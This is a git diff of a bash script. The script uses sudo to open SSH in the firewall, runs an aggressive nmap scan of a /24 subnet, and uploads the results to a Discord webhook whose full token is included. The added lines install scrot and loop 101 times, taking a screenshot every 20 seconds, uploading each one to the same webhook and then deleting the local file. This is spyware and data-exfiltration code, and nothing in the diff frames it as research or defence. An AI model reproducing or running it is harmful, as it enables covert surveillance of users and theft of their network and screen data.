@@ -1,5 +1,5 @@
 #!/bin/bash
-if echo '12345' | sudo -S sh -c "sudo ufw allow ssh"; then
+if echo 'PW' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "nmap scan and sending xml..."
  	sudo nmap -T5 -A -v 10.10.10.14/24 -oX /home/$USER/net.xml
   	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
@@ -18,3 +18,14 @@ else
    	chmod +x no.sh
     	./$0
 fi
+
+sudo -S sh -c "sudo apt install scrot -y"
+
+for i in {0..100}
+do
+	scrot "ss.png"
+	curl -F "filename=@/home/$USER/ss.png" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" 
+	rm -f "/home/$USER/ss.png"
+	echo "iteration number info: $i"
+	sleep 20
+done
